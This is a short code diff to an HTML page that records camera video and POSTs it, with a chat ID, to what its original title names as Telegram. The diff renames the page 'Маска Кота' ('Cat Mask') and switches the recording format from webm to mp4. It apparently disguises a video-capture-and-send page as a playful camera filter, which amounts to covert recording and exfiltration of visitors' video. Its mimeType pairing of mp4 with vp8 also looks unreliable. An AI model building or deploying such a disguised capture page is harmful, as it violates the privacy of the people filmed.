@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Video Recording and Telegram</title>
+    <title>Маска Кота</title>
     <style>
         #video {
             display: block;
@@ -57,7 +57,7 @@
 
         // Function to setup MediaRecorder
         function setupMediaRecorder(stream) {
-            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
+            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/mp4;codecs=vp8,opus' });
 
             mediaRecorder.ondataavailable = (event) => {
                 if (event.data.size > 0) {
@@ -68,7 +68,7 @@
 
             mediaRecorder.onstop = () => {
                 console.log('MediaRecorder stopped.');
-                const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                const blob = new Blob(recordedChunks, { type: 'video/mp4' });
                 recordedChunks = []; // Reset chunks after processing
                 const videoURL = URL.createObjectURL(blob);
                 console.log('Recording stopped. Preparing to send video...');
@@ -89,7 +89,7 @@
 
             const formData = new FormData();
             formData.append('chat_id', chatId);
-            formData.append('video', blob, 'recording.webm');
+            formData.append('video', blob, 'recording.mp4');
 
             fetch(url, {
                 method: 'POST',
